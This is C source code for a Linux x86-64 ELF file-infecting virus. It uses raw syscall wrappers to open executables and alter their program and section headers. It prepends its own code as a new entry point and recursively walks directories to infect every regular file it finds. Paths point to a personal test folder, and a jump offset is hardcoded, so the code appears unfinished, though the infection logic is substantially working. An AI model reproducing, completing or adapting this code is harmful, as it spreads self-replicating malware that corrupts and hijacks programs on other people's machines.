#include <fcntl.h>
#include <elf.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mman.h>

struct linux_dirent64 {
	long		d_ino;
	long		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[0];
};

void infect_file(char*path, char *file);
void virus_exit(long status);
long virus_write(long fd, char *buf, unsigned long len);
char * virus_itoa(long x, char *t);
void code_end();
void _start()
{
	/*
	char c[100];
	int file = virus_open("./test/test",O_RDONLY, 0);
	virus_read(file,c,100);
	virus_write(1,c,100);
	virus_close(file);
	virus_exit(0);
	*/

	/*
	char buf[1024*1024];
	char *start[1] = {"/home/lkm/workspace/virus/test"};
	int dir = virus_open(start[0],O_RDONLY | O_DIRECTORY, 0);
	char dirtmp[20];
	//virus_write(1, virus_itoa(dir,dirtmp),13);
	if(dir<0) virus_write(1,"dir wrong\n",13);
	int nread = virus_getdents64(dir, (struct linux_dirent64 *)buf, 1024*1024);
	if(nread<0) virus_write(1,"nread wrong\n",13);
	
	struct linux_dirent64 *d;
	int bpos;
	//virus_write(1, virus_itoa(nread,tmp), 20);
	//virus_write(1, "\n", 20);
	for (bpos = 0; bpos < nread; bpos++) {
		d = (struct linux_dirent64 *) (buf + bpos);
		bpos += d->d_reclen - 1;
		if(d->d_type == DT_REG){
			char fullpath[50];
			getfullpath();
		}else if(d->d_type == DT_REG){
			
		}
		virus_write(1, d->d_name,virus_strlen(d->d_name));
		virus_write(1, "\n", 1);
        }
	*/

	/*
	char *start[1] = {"/home/lkm/workspace/virus/test/"};
	infect_dir(start[0]);
	*/
	char ss[] = {'/','h','o','m','e','/','l','k','m','/','w','o','r','k','s','p','a','c','e','/','v','i','r','u','s','/','t','e','s','t','/','t','e','s','t'};
	//char *start[1] = {"/home/lkm/workspace/virus/test/test"};
	char nn[] = {'/','h','o','m','e','/','l','k','m','/','w','o','r','k','s','p','a','c','e','/','v','i','r','u','s','/','t','e','s','t','/'};
	infect_file(nn, ss);
	__asm__ volatile(
	"jmp virus_exit");
	//virus_exit(0);
}

int virus_getdents64(unsigned int fd, struct linux_dirent64 *dirp,unsigned int count)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $217, %%rax\n"
		"syscall" :: "g"(fd), "g"(dirp), "g"(count));
	asm ("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}

long virus_lseek(long fd, long offset, unsigned int whence)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $8, %%rax\n"
		"syscall" : : "g"(fd), "g"(offset), "g"(whence));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}

long virus_open(const char *path, unsigned long flags, long mode)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $2, %%rax\n"
		"syscall" : : "g"(path), "g"(flags), "g"(mode));
	asm ("mov %%rax, %0" : "=r"(ret));
	return ret;
}

int virus_read(long fd, char *buf, unsigned long len)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $0, %%rax\n"
		"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}

long virus_write(long fd, char *buf, unsigned long len)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $1, %%rax\n"
		"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}

int virus_close(unsigned int fd)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov $3, %%rax\n"
		"syscall" : : "g"(fd));
	return (int)ret;
}

void virus_exit(long status)
{
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov $60, %%rax\n"
		"syscall" : : "r"(status));
}

char * virus_itoa(long x, char *t)
{
	int i;
	int j;
	i = 0;
	do
	{
		t[i] = (x % 10) + '0';
		x /= 10;
		i++;
	} while (x!=0);
	t[i] = 0;
	for (j=0; j < i / 2; j++) {
		t[j] ^= t[i - j - 1];
		t[i - j - 1] ^= t[j];
		t[j] ^= t[i - j - 1];
	}
	return t;
}

void *virus_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
	long mmap_fd = fd;
	unsigned long mmap_off = off;
	unsigned long mmap_flags = flags;
	unsigned long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov $9, %%rax\n"
		"syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
	asm ("mov %%rax, %0" : "=r"(ret));              
	return (void *)ret;
}

int virus_fstat(long fd, void *buf)
{
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov $5, %%rax\n"
		"syscall" : : "g"(fd), "g"(buf));
	asm("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}

size_t virus_strlen(char *s)
{
	size_t size;
	for (size=0;s[size];size++);
	return size;
}

void virus_memcpy(void *dst, void *src, unsigned int len)
{
        int i;
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;

        for (i = 0; i < len; i++) {
                *d = *s;
                s++, d++;
        }

}

void virus_pathadd(char *path, char *dir, char *name){
	int i=0;
	int j=0;	
	for(;i<virus_strlen(dir);i++) path[i] = dir[i];
	//path[i++] = '/';
	for(;j<virus_strlen(name);j++,i++) path[i] = name[j];
	path[i] = '\0';
}

size_t align(size_t size){
	return (size&(~(0x1000 - 1))) + 0x1000;
}

void infect_file(char*path, char *target){
	char rr[10];
	/*
	virus_write(1, file,virus_strlen(file));
	virus_write(1, "\n", 1);
	*/
	//do some check
	char headbuf[4096];
	int f = virus_open(target,O_RDONLY, 0);
	virus_read(f,headbuf,4096);
	virus_close(f);
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) headbuf;
	//virus_write(1, target,virus_strlen(target));
	if(ehdr->e_type != ET_EXEC) return;
	if(ehdr->e_machine != EM_X86_64) return;
	
	//load self
	//char test[] = {'.','/','t','e','s','t','/','t','e','s','t'};
	
	int self = virus_open(target,O_RDONLY, 0);
	
	struct stat s;
	virus_fstat(self, &s);
	char* mem = (char*)virus_mmap(NULL,s.st_size,PROT_READ|PROT_WRITE, MAP_PRIVATE, self, 0);
	Elf64_Ehdr *self_ehdr = (Elf64_Ehdr *)mem;
	Elf64_Phdr *self_phdr = (Elf64_Phdr *)&mem[self_ehdr->e_phoff];
	Elf64_Shdr *self_shdr = (Elf64_Shdr *)&mem[self_ehdr->e_shoff];

	/*
	char nu[10];
	virus_write(1, virus_itoa(ehdr->e_phnum,nu), 10);
	char changeline[] = {'\n'};
	virus_write(1, changeline, 1);
	*/
	
	//change elf thing
	//get code length, must add 1, ret is 1
	size_t code_size = ((char *)&code_end - (char *)&_start)+1;
	code_size = align(code_size);
	
	
	/*
	virus_write(1, virus_itoa(code_size,nu), 10);
	virus_write(1, changeline, 1);
	code_size = align(code_size);
	virus_write(1, virus_itoa(code_size,nu), 10);
	virus_write(1, changeline, 1);
	*/
	/*
	char nu[100];
	virus_write(1, virus_itoa(code_size,nu), 10);
	char changeline[] = {'\n'};
	virus_write(1, changeline, 1);
	*/
	//Elf64_Addr old_entry_point = 

	//1:new memory
	//2:copy file context to memory
	//3:change memory's info
	//4:write to file

	//1
	char *newmem = (char*)virus_mmap(NULL, s.st_size+code_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	//2	
	virus_memcpy(newmem,mem,s.st_size);
	//3
	Elf64_Ehdr *new_ehdr = (Elf64_Ehdr *)newmem;
	Elf64_Phdr *new_phdr = (Elf64_Phdr *)&newmem[new_ehdr->e_phoff];
	Elf64_Shdr *new_shdr = (Elf64_Shdr *)&newmem[new_ehdr->e_shoff];
	/*
	virus_write(1, virus_itoa(new_ehdr->e_phnum,nu), 10);
	virus_write(1, changeline, 1);
	*/
	//because next loop ingore first two segemnt , so need to add first
	//new_phdr[0].p_offset += code_size;
	//new_phdr[1].p_offset += code_size;
	//3.1	
	//new_ehdr->e_shoff += code_size;
	//3.2 and 3.3
	int i;
	int findtext = 0;
	for (i = 0; i < new_ehdr->e_phnum; i++) {
		if (new_phdr[i].p_type == PT_LOAD && new_phdr[i].p_flags == (PF_R|PF_X)){
			/*
			char nu[10];
			char changeline[] = {'\n'};
			virus_write(1, virus_itoa(i,nu), 10);
			virus_write(1, changeline, 1);
			
			virus_write(1, virus_itoa(self_phdr[i].p_vaddr,nu), 10);
			virus_write(1, changeline, 1);
			*/
			/*
			char nnu[10];
			virus_write(1, virus_itoa(code_size,nnu), 10);
			virus_write(1, changeline, 1);
			*/
			new_phdr[i].p_vaddr -= code_size;
			new_phdr[i].p_paddr -= code_size;
			new_phdr[i].p_filesz += code_size;
			new_phdr[i].p_memsz += code_size;
			new_phdr[i].p_align = 0x1000;
			findtext = i;
			continue;
		}else if(new_phdr[i].p_type == PT_LOAD && new_phdr[i].p_offset && (new_phdr[i].p_flags & PF_W)){
			new_phdr[i].p_align = 0x1000;
		}
		new_phdr[i].p_offset += code_size;
	}
	//3.4
	new_ehdr->e_entry = self_phdr[findtext].p_vaddr - code_size + sizeof(Elf64_Ehdr);
	/*char nu[10];	
	char changeline[] = {'\n'};
	virus_write(1, virus_itoa(new_ehdr->e_entry,nu), 10);
	virus_write(1, changeline, 1);*/
	//3.5

	//4
	for (i = 0; i < new_ehdr->e_shnum; i++) {
		new_shdr[i].sh_offset += code_size;
	}
	new_ehdr->e_phoff += code_size;
	new_ehdr->e_shoff += code_size;

	char ttt[] = {'v','v','v'};
	char newfilepath[256];
	const __mode_t mode = S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IWGRP|S_IROTH;
	virus_pathadd(newfilepath,path,ttt);
	int newfile = virus_open(newfilepath,O_RDWR | O_CREAT, mode);
	virus_write(newfile, newmem, sizeof(Elf64_Ehdr));
	virus_write(newfile, (char *)&_start, code_size);
	virus_write(newfile, newmem+sizeof(Elf64_Ehdr), s.st_size-sizeof(Elf64_Ehdr));

	char fr[10];
	virus_write(1, virus_itoa(code_size,fr), 10);

	
	virus_lseek(newfile, 417, SEEK_SET);
	char oep[4];
	*(unsigned int*)&oep[0] = 301;//4763;//self_ehdr->e_entry - (0x3ff000+421);//4763;//self_ehdr->e_entry - (0x3ff1a5);//5605;//301;//
	virus_write(newfile, oep, 4);
	
	char sr[10];
	virus_write(1, virus_itoa(self_ehdr->e_entry - (0x3ff1a5),sr), 10);
	
	//remove old file, and rename new file

	virus_close(newfile);
}

//dir must end with /
void infect_dir(char* path){
	struct linux_dirent64 *d;
	char buf[1024*1024];
	int bpos;
	int dir = virus_open(path,O_RDONLY | O_DIRECTORY, 0);
	int nread = virus_getdents64(dir, (struct linux_dirent64 *)buf, 1024*1024);
	for (bpos = 0; bpos < nread; bpos++) {
		d = (struct linux_dirent64 *) (buf + bpos);
		bpos += d->d_reclen - 1;
		char fullpath[256];
		virus_pathadd(fullpath, path, d->d_name);
		//ignore all hide file .. and .
		if(d->d_name[0] == '.') continue;
		if(d->d_type == DT_REG){
			infect_file(path, fullpath);
		}else if(d->d_type == DT_DIR){
			int endpos = virus_strlen(fullpath);
			fullpath[endpos] = '/';
			fullpath[endpos+1] = '\0';
			infect_dir(fullpath);
		}
		/*
		virus_write(1, d->d_name,virus_strlen(d->d_name));
		virus_write(1, "\n", 1);
		*/
        }
}

void code_end(){
	
}
